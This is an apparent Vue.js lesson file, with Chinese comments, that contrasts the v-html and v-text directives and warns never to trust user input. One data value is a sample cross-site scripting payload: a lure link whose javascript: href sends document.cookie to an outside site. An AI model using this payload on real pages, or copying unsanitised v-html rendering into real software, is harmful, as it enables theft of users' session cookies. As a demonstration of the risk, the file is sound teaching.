<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>v-html指令</title>
    <script src="../js/vue.js"></script>
</head>

<body>
    <div id="root">
        <div v-text="str"></div>
        <div v-html="str"></div>
        <div v-html="str2"></div>
    </div>
    <script>
        Vue.config.productionTip = false;
        new Vue({
            el: "#root",
            data: {
                name: '上海',
                //注意v-html会解析标签，这点与v-text不一样
                str: '<h1>hello, shanghai</h1>',
                //危险行为 永远不要相信用户的输入
                str2: '<a href=javascript:location.href="https://www.baidu.com?"+document.cookie>找到资源了兄弟,快来！</a>'
            }
        })
    </script>
</body>

</html>
